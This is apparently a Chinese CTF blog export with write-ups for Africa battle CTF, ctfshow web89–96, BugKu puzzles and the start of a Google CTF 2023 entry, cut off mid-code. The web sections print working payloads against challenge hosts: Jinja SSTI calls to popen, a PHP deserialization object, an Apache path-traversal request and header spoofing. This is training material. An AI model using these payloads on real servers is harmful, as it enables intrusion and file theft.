[{"title":"Africa battle CTF","url":"/2023/06/26/Africa-battle-CTF/","content":"<h1 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h1><h2 id=\"Civilization\"><a href=\"#Civilization\" class=\"headerlink\" title=\"Civilization\"></a>Civilization</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require</span>(<span class=\"string\">&quot;./flag.php&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;source&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;ami&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$input</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;ami&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$cigar</span> = <span class=\"string\">&#x27;africacradlecivilization&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&quot;/<span class=\"subst\">$cigar</span>/&quot;</span>,<span class=\"string\">&#x27;&#x27;</span>,<span class=\"variable\">$input</span>) === <span class=\"variable\">$cigar</span>) &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">africa</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&quot;home.html&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n\n<p>?source得到这个，这个只用双写就可以绕过。</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?ami=africacradlecafricacradlecivilizationivilization</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Cobalt-Injection\"><a href=\"#Cobalt-Injection\" class=\"headerlink\" title=\"Cobalt Injection\"></a>Cobalt Injection</h2><p>在源代码里有</p>\n<p><code>&lt;!-- IP?capital=Benin --&gt;</code></p>\n<p><img src=\"/pic/Africa/8085.png\"></p>\n<p>可知存在ssti模板注入。没有过滤。</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?capital=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>当然看别人的WP，要长脑子了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?capital=&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>#request.application：表示当前请求的应用程序对象。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?capital=&#123;&#123;().__class__.__base__.__subclasses__()[354](&#x27;cat flag.txt&#x27;, shell=True, stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个还没搞明白，搞明白了再回来修改。</p>\n<h2 id=\"Fa\"><a href=\"#Fa\" class=\"headerlink\" title=\"Fâ\"></a>Fâ</h2><p>访问?source</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"string\">&quot;flag.php&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;source&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">africa</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> <span class=\"variable\">$boknn</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> <span class=\"variable\">$du</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;fa&#x27;</span>])) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$vodoo</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;fa&#x27;</span>];</span><br><span class=\"line\">       </span><br><span class=\"line\">        <span class=\"variable\">$fa</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$vodoo</span>);</span><br><span class=\"line\">       </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$fa</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$fa</span>-&gt;du=<span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$fa</span>-&gt;du === <span class=\"variable\">$fa</span>-&gt;boknn)</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Congratulation! You&#x27;ve got the best interpretation: &lt;b&gt;&quot;</span>.<span class=\"variable\">$fa</span>-&gt;du.<span class=\"string\">&quot;&lt;/b&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Oh no...&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you dey smoke igbo?&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"string\">&quot;home.html&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n\n<p>反序列化，只要将传入的fa值和$du相等就可以输出flag。</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?fa=O:6:&quot;africa&quot;:2:&#123;s:5:&quot;boknn&quot;;N;s:2:&quot;du&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其中，boknn的值为NULL，du的值通过R引用了编号为2的值，</p>\n<p><img src=\"/pic/Africa/8084.png\"></p>\n<p>boknn的编号就为2。</p>\n<p>具体的可以看:<a href=\"https://wiki.wgpsec.org/knowledge/ctf/php-serialize.html\">https://wiki.wgpsec.org/knowledge/ctf/php-serialize.html</a></p>\n<h2 id=\"Own-reality\"><a href=\"#Own-reality\" class=\"headerlink\" title=\"Own reality\"></a>Own reality</h2><p>真是让我长见识了。</p>\n<p>首先是.git泄露</p>\n<p>用wget将网站下载下来</p>\n<p> `wget <a href=\"http://chall.battlectf.online:8082/.git/\">http://chall.battlectf.online:8082/.git/</a> -mirror</p>\n<p>使用 <code>--mirror</code> 选项你可以下载整个站点，包括它的目录结构。</p>\n<p>然后用git reflog查看历史版本，之后用git cherry-pick ‘你想要恢复的’</p>\n<p>会出来一个flag.txt,尾部有</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.__..._..__...._.___._...___._...__.__...__.._._._....__._._._..._...__..____.__._._._._.__.___..__._.__.__.___..__.____.___.___.__.___.._._____.__..._..__._.._.___._...___..__._._____..__..__..___.....__._...__.._._.__.._._.__...._..__._....___.._.__..._...__._....__..._..__.___.__.._._.__.._._..__.._..__..__..__..__...__._._.__...._..__..._..__..__.__..__..__..._..__.._...__...__.__...__.__...._..__.__..__..__...__..__..__.._...__.___._____._</span><br></pre></td></tr></table></figure>\n\n<p>二进制转换为字符就是flag</p>\n<h2 id=\"It-shock-you\"><a href=\"#It-shock-you\" class=\"headerlink\" title=\"It shock you\"></a>It shock you</h2><p>先用whatweb看网站，</p>\n<p><img src=\"/pic/Africa%5C8083.1.png\"></p>\n<p>可以看到apache的版本，去网上找相对应的漏洞能找到，目录穿越</p>\n<p>POC:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/flag.txt HTTP/1.1</span><br><span class=\"line\">Host: chall.battlectf.online:8083</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">DNT: 1</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Cookie: PHPSESSID=6ae53a7d294917d5fdac2db41c97b477</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">If-Modified-Since: Tue, 06 Jun 2023 14:53:49 GMT</span><br><span class=\"line\">If-None-Match: &quot;b6d-5fd772fd55940&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Africa\"><a href=\"#Africa\" class=\"headerlink\" title=\"Africa\"></a>Africa</h2><p><code>Warning: This site is only for africa people.</code></p>\n<p>在bp中将<code>User-Agent</code>改为<code>africa</code></p>\n<p><code>     Warning: Go away! Attacker! This page is only for local client!</code></p>\n<p>用<code>X-Forwarded-For</code>伪造127.0.0.1</p>\n<p><code>Warning: I don&#39;t trust users who are not from battlectf.online</code></p>\n<p>用<code>Referer</code>绕过得到flag。</p>\n<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h2 id=\"Back-To-Origin\"><a href=\"#Back-To-Origin\" class=\"headerlink\" title=\"Back To Origin\"></a>Back To Origin</h2><p>埃及象形文</p>\n<p><a href=\"https://girlstart.org/wp-content/uploads/2020/05/Decoding-Hieroglyphics.pdf\">https://girlstart.org/wp-content/uploads/2020/05/Decoding-Hieroglyphics.pdf</a></p>\n<p>可以参考上面的链接</p>\n<h2 id=\"Blind\"><a href=\"#Blind\" class=\"headerlink\" title=\"Blind\"></a>Blind</h2><p><a href=\"https://gchq.github.io/CyberChef/\">https://gchq.github.io/CyberChef/</a></p>\n<p>首先是<code>magic</code>解码，然后 <code>braille</code>,解码得到flag</p>\n<h2 id=\"ROCYOU\"><a href=\"#ROCYOU\" class=\"headerlink\" title=\"ROCYOU\"></a>ROCYOU</h2><p><code>factordb</code>和<code>yafu</code>分解不出来，看别人的博客知道有<code>ROCA漏洞</code>，可以从公钥中提取私钥</p>\n<p>工具：</p>\n<p><a href=\"https://gitlab.com/parfaittolefo23/astuces-et-write-up-ctf/-/blob/main/Tools/neca\">https://gitlab.com/parfaittolefo23/astuces-et-write-up-ctf/-/blob/main/Tools/neca</a></p>\n<p>一开始运行要给权限</p>\n<p><img src=\"/pic/Africa/rock.png\"></p>\n<p>可以用在线的rsa解密工具：<a href=\"https://www.dcode.fr/chiffre-rsa\">https://www.dcode.fr/chiffre-rsa</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">p=127801155916875524149457561567678575565270601000365665873572024750823913157383</span><br><span class=\"line\">q=113917064871970833547038329106470040388258358281464605006613652518914797349747</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"goose\"><a href=\"#goose\" class=\"headerlink\" title=\"goose\"></a>goose</h2><p>首先给了5个随机数，然后将falg的每个字符通过<code>res = (2*a*pow(ord(x),4)+b*pow(ord(x),3)+c*pow(ord(x),2)+d*ord(x)+e)</code>进行加密。</p>\n<p>flag的前几个字符是知道的，可以列方程组计算一下a,b,c,d,e的值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">184473632*a+941192*b+9604*c+98*d+1*e=1245115057305148164</span><br><span class=\"line\">177058562*a+912673*b+9409*c+97*d+1*e=1195140205147730541</span><br><span class=\"line\">362127872*a+1560896*b+13456*c+116*d+1*e=2441940832124642988</span><br><span class=\"line\">362127872*a+1560896*b+13456*c+116*d+1*e=2441940832124642988</span><br><span class=\"line\">272097792*a+1259712*b+11664*c+108*d+1*e=1835524676869638124</span><br><span class=\"line\">208120802*a+1030301*b+10201*c+101*d+1*e=1404473868033353193</span><br></pre></td></tr></table></figure>\n\n<p>解得：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">a=6709636436</span><br><span class=\"line\">b=7748795321</span><br><span class=\"line\">c=7386429784</span><br><span class=\"line\">d=62359624</span><br><span class=\"line\">e=5008041292</span><br></pre></td></tr></table></figure>\n\n<p>然后写代码爆破:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">a=<span class=\"number\">6709636436</span></span><br><span class=\"line\">b=<span class=\"number\">7748795321</span></span><br><span class=\"line\">c=<span class=\"number\">7386429784</span></span><br><span class=\"line\">d=<span class=\"number\">62359624</span></span><br><span class=\"line\">e=<span class=\"number\">5008041292</span></span><br><span class=\"line\">tab=[<span class=\"number\">1245115057305148164</span>, <span class=\"number\">1195140205147730541</span>, <span class=\"number\">2441940832124642988</span>, <span class=\"number\">2441940832124642988</span>, <span class=\"number\">1835524676869638124</span>, <span class=\"number\">1404473868033353193</span>, <span class=\"number\">272777109172255911</span>, <span class=\"number\">672752034376118188</span>, <span class=\"number\">324890781330979572</span>, <span class=\"number\">3086023531811583439</span>, <span class=\"number\">475309634185807521</span>, <span class=\"number\">1195140205147730541</span>, <span class=\"number\">2441940832124642988</span>, <span class=\"number\">1578661367846445708</span>, <span class=\"number\">2358921859155462327</span>, <span class=\"number\">1099718459319293547</span>, <span class=\"number\">773945458916291731</span>, <span class=\"number\">78288818574073053</span>, <span class=\"number\">2441940832124642988</span>, <span class=\"number\">1578661367846445708</span>, <span class=\"number\">1099718459319293547</span>, <span class=\"number\">343816904985468003</span>, <span class=\"number\">1195140205147730541</span>, <span class=\"number\">2527132076695959961</span>, <span class=\"number\">2358921859155462327</span>, <span class=\"number\">2358921859155462327</span>, <span class=\"number\">1099718459319293547</span>, <span class=\"number\">72109063929756364</span>, <span class=\"number\">2796116718132693772</span>, <span class=\"number\">72109063929756364</span>, <span class=\"number\">2796116718132693772</span>, <span class=\"number\">72109063929756364</span>, <span class=\"number\">2796116718132693772</span>, <span class=\"number\">3291439457645322417</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encrypt</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"number\">2</span>*a*<span class=\"built_in\">pow</span>(<span class=\"built_in\">ord</span>(x),<span class=\"number\">4</span>)+b*<span class=\"built_in\">pow</span>(<span class=\"built_in\">ord</span>(x),<span class=\"number\">3</span>)+c*<span class=\"built_in\">pow</span>(<span class=\"built_in\">ord</span>(x),<span class=\"number\">2</span>)+d*<span class=\"built_in\">ord</span>(x)+e)</span><br><span class=\"line\"><span class=\"keyword\">for</span> val <span class=\"keyword\">in</span> tab:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>,<span class=\"number\">126</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(encrypt(<span class=\"built_in\">chr</span>(i))==val):</span><br><span class=\"line\">            flag+=<span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"RE\"><a href=\"#RE\" class=\"headerlink\" title=\"RE\"></a>RE</h1><h2 id=\"seyi\"><a href=\"#seyi\" class=\"headerlink\" title=\"seyi\"></a>seyi</h2><p>ida64位打开,flag在getshell里面。</p>\n<h2 id=\"welcome\"><a href=\"#welcome\" class=\"headerlink\" title=\"welcome\"></a>welcome</h2><p><img src=\"/pic/Africa/welcome.png\"></p>\n<p>重点就是这个，</p>\n<p>add就是加，</p>\n<p>xor就是异或。</p>\n<p>很简单的一个表达式。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\">a = <span class=\"number\">0x522D1B20F6</span></span><br><span class=\"line\">b = <span class=\"number\">0x1EE2EEEE</span></span><br><span class=\"line\">c = a+b</span><br><span class=\"line\">d = <span class=\"number\">0x0AA84AAA</span></span><br><span class=\"line\">flag = c^d</span><br><span class=\"line\">flag = long_to_bytes(flag)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Infinity\"><a href=\"#Infinity\" class=\"headerlink\" title=\"Infinity\"></a>Infinity</h2><p><img src=\"/pic/Africa/in.png\"></p>\n<p>找到汇编代码里所有的push，然后将值转换一下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">a=\t[p64(<span class=\"number\">0x5F4F7572</span>),</span><br><span class=\"line\">\tp64(<span class=\"number\">0x6C654354</span>),</span><br><span class=\"line\">\tp64(<span class=\"number\">0x467B4265</span>),</span><br><span class=\"line\">\tp64(<span class=\"number\">0x796F6E64</span>),</span><br><span class=\"line\">\tp64(<span class=\"number\">0x62617474</span>),</span><br><span class=\"line\">\tp64(<span class=\"number\">0x47616C61</span>),</span><br><span class=\"line\">\tp64(<span class=\"number\">0x7869657D</span>)]</span><br><span class=\"line\"><span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(c)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">b&#x27;ruO_\\x00\\x00\\x00\\x00&#x27;</span><br><span class=\"line\">b&#x27;TCel\\x00\\x00\\x00\\x00&#x27;</span><br><span class=\"line\">b&#x27;eB&#123;F\\x00\\x00\\x00\\x00&#x27;</span><br><span class=\"line\">b&#x27;dnoy\\x00\\x00\\x00\\x00&#x27;</span><br><span class=\"line\">b&#x27;ttab\\x00\\x00\\x00\\x00&#x27;</span><br><span class=\"line\">b&#x27;alaG\\x00\\x00\\x00\\x00&#x27;</span><br><span class=\"line\">b&#x27;&#125;eix\\x00\\x00\\x00\\x00&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>然后将这些反转一下删掉多余的东西</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">_Our</span><br><span class=\"line\">leCT</span><br><span class=\"line\">F&#123;Be</span><br><span class=\"line\">batt</span><br><span class=\"line\">Gala</span><br><span class=\"line\">xie&#125;</span><br><span class=\"line\">yond</span><br></pre></td></tr></table></figure>\n\n<p>最后将这些拼接一下，<code>battleCTF&#123;Beyond_OurGalaxie&#125; </code>。</p>\n<h2 id=\"babyrev\"><a href=\"#babyrev\" class=\"headerlink\" title=\"babyrev\"></a>babyrev</h2><p>用ida打开，查询字符串能发现<code>qpiiatRIU&#123;Pvqp_Ugt3_UDDS_Stn_d0D!_85864r1277qu8195pqqtp6540494pr46&#125;</code>，然后凯撒解密得到flag</p>\n<h2 id=\"checker\"><a href=\"#checker\" class=\"headerlink\" title=\"checker\"></a>checker</h2><p>和上一题基本上差不多</p>\n<p><code>gfyyqjHYK&#123;Flg4_d0z_i3d_xr0p3_1lg0?&#125;</code>然后凯撒解密</p>\n","categories":["ctf","复盘"],"tags":["ctf"]},{"title":"ctfshow web89~96","url":"/2023/02/02/89/","content":"<h1 id=\"web89\"><a href=\"#web89\" class=\"headerlink\" title=\"web89\"></a>web89</h1><p><img src=\"/pic/89.png\"><br>用数组绕过就行。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?num[]=a;</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h1 id=\"web90\"><a href=\"#web90\" class=\"headerlink\" title=\"web90\"></a>web90</h1><p><img src=\"/pic/90.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">intval( mixed $var[, int $base = 10] ) : int</span><br><span class=\"line\"></span><br><span class=\"line\">var</span><br><span class=\"line\">要转换成 integer 的数量值</span><br><span class=\"line\">base</span><br><span class=\"line\">转化所使用的进制 </span><br><span class=\"line\">Note: </span><br><span class=\"line\">如果 base 是 0，通过检测 var 的格式来决定使用的进制： </span><br><span class=\"line\">◦ 如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，  </span><br><span class=\"line\">◦ 如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，  </span><br><span class=\"line\">◦ 将使用 10 进制 (decimal)。 </span><br></pre></td></tr></table></figure>\n<p>只需要提交0x117c就行，0x117c是16进制的4476，也可以提交4476+字符。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?num=0x117c</span><br><span class=\"line\">?num=4476a</span><br></pre></td></tr></table></figure>\n<h1 id=\"web91\"><a href=\"#web91\" class=\"headerlink\" title=\"web91\"></a>web91</h1><p><img src=\"/pic/91.png\"><br>第一次是/im第二次是/i<br>/im可以匹配多行，/i只能匹配一行。<br>所以让他第一次匹配到php第二次匹配不到php。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?cmd=1%0aphp</span><br></pre></td></tr></table></figure>\n<h1 id=\"web92\"><a href=\"#web92\" class=\"headerlink\" title=\"web92\"></a>web92</h1><p><img src=\"/pic/92.png\"><br>可以换个进制绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?num=0x117c</span><br></pre></td></tr></table></figure>\n<p>或者还有e这个东西</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?num=4476e123</span><br></pre></td></tr></table></figure>\n<h1 id=\"web93\"><a href=\"#web93\" class=\"headerlink\" title=\"web93\"></a>web93</h1><p><img src=\"/pic/93.png\"><br>可以用小数，也可以用8进制<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?num=4476.1</span><br><span class=\"line\">?num=010574</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">二进制0bxxx</span><br><span class=\"line\">八进制0xxxxxx</span><br><span class=\"line\">十六进制0xaaaa</span><br></pre></td></tr></table></figure>\n<h1 id=\"web94\"><a href=\"#web94\" class=\"headerlink\" title=\"web94\"></a>web94</h1><p><img src=\"/pic/94.png\"><br>strpos是匹配字符，必须要匹配到0而且还不能在第一位，可以用8进制也可以用小数。<br>如果用8进制的话必须在开头加一个空格。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?num=4476.0</span><br><span class=\"line\">/?num= 010574</span><br></pre></td></tr></table></figure>\n<h1 id=\"web95\"><a href=\"#web95\" class=\"headerlink\" title=\"web95\"></a>web95</h1><p><img src=\"/pic/95.png\"><br>这一道题多过滤了一个点，所以没法用小数了，其他的跟上一道题一样。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?num= 010574</span><br></pre></td></tr></table></figure>\n<h1 id=\"web96\"><a href=\"#web96\" class=\"headerlink\" title=\"web96\"></a>web96</h1><p><img src=\"/pic/96.png\"><br>想办法读取flag.php还不能直接传flag.php，利用路径或者php协议就行。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?u=/var/www/html/flag.php</span><br><span class=\"line\">?u=./flag.php</span><br><span class=\"line\">?u=php://filter/resource=falg.php</span><br></pre></td></tr></table></figure>","categories":["ctfshow","刷题","php特性"],"tags":["ctfshow","刷题","php特性"]},{"title":"BugKu刷题","url":"/2023/01/28/BugKu%E5%88%B7%E9%A2%98/","content":"<h1 id=\"聪明的小羊\"><a href=\"#聪明的小羊\" class=\"headerlink\" title=\"聪明的小羊\"></a>聪明的小羊</h1><p>题目描述：一只小羊翻过了2个栅栏 fa{fe13f590lg6d46d0d0}<br>栅栏密码，分两栏时就是flag。</p>\n<span id=\"more\"></span>\n<p>flag:<code>flag&#123;6fde4163df05d900&#125;</code></p>\n<h1 id><a href=\"#\" class=\"headerlink\" title=\"/.-\"></a>/.-</h1><p>题目描述： ..-./.-../.-/–./—-.–/-../…–/..-./-.-./-…/..-./.—-/–…/..-./—-./…–/—-./—-./…../—–/….-/—–.-<br>很明显的摩斯密码，<a href=\"https://www.lddgo.net/encrypt/morse\">在线摩斯密码翻译</a>，可以解出flag：FLAG%u7bD3FCBF17F9399504%u7d<br>%u7b是{，%u7d是}，然后字母全部改为小写就是flag。<br>flag:<code>flag&#123;d3fcbf17f9399504&#125;</code></p>\n<h1 id=\"ok\"><a href=\"#ok\" class=\"headerlink\" title=\"ok\"></a>ok</h1><p>题目是okk编码，用<a href=\"https://www.splitbrain.org/services/ook\"></a>可以直接获得flag。<br>flag：<code>flag&#123;0a394df55312c51a&#125;</code></p>\n<h1 id=\"linux\"><a href=\"#linux\" class=\"headerlink\" title=\"linux\"></a>linux</h1><p>下载文件解压，用记事本的形式打开文件，ctrl+搜索key就能找到flag。<br>flag:<code>key&#123;feb81d3834e2423c9903f4755464060b&#125;</code></p>\n<h1 id=\"闪的好快\"><a href=\"#闪的好快\" class=\"headerlink\" title=\"闪的好快\"></a>闪的好快</h1><p>下载是一个gif图，用stegsolve打开，一帧一帧扫二维码，然后拼接起来就是flag。<br>flag：<code>SYC&#123;F1aSh_so_f4sT&#125;</code></p>\n<h1 id=\"隐写2\"><a href=\"#隐写2\" class=\"headerlink\" title=\"隐写2\"></a>隐写2</h1><p>图片的大小感觉和他本身有点不符，用binwalk一看，确实有隐藏的文件。<br>分离之后是一个压缩包和一个提示，提示说明解压密码是三位数字。<br>暴力破解一下，密码是871，解压之后又是一个图片，用记事本打开，末尾有<code>f1@g&#123;eTB1IEFyZSBhIGhAY2tlciE=&#125;</code><br>base64解码得到falg。<br>flag：<code>f1@g&#123;y0u Are a h@cker!&#125;</code></p>\n<h1 id=\"白哥的鸽子\"><a href=\"#白哥的鸽子\" class=\"headerlink\" title=\"白哥的鸽子\"></a>白哥的鸽子</h1><p>用stegsolve打开，fileformat最下面有类似于flag的文字。<a href=\"http://moersima.00cha.net/shanlan.asp\">栅栏密码在线加密解密</a>栅栏加密，<br>当栅栏数为3时，就是flag。<br>flag：<code>flag&#123;w22_is_v3ry_cool&#125;</code></p>\n<h1 id=\"再也没有纯白的灵魂\"><a href=\"#再也没有纯白的灵魂\" class=\"headerlink\" title=\"再也没有纯白的灵魂\"></a>再也没有纯白的灵魂</h1><p>文件开头是~呜嗷开头的，查过之后才发现是兽音密文<a href=\"https://roar.iiilab.com/\"></a>。由于不知道怎么加密的，就先将flag加密一下试试，然后一一对应，最坑人的是少了一个G，真的恶心人。。。。<br>最后解出来就是flag。<br>flag：<code>flag&#123;ni-zhen-shi-shou-ren&#125;</code></p>\n","categories":["BugKu","刷题"],"tags":["刷题","BugKu"]},{"title":"Google-CTF2023","url":"/2023/06/29/Google-CTF2023/","content":"<h1 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h1><h2 id=\"PAPAPAPA\"><a href=\"#PAPAPAPA\" class=\"headerlink\" title=\"PAPAPAPA\"></a>PAPAPAPA</h2><p>下载下来附件是一张全白的图片，通过修改jpg的宽高获得flag</p>\n<p><img src=\"/pic/googlectf/papapa.png\"></p>\n<p>从<code>FF</code>到<code>01</code>中间，修改成<code>FF C0 00 11 08 02 00 02 10 03 01 31 00 02 31 01 03 31 01</code></p>\n<p>右边就是flag</p>\n<h1 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h1><h2 id=\"UNDER-CONSTRUCTION\"><a href=\"#UNDER-CONSTRUCTION\" class=\"headerlink\" title=\"UNDER-CONSTRUCTION\"></a>UNDER-CONSTRUCTION</h2><p>给了一个flask和一个php的服务，没有办法ssti注入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getResponse</span>(<span 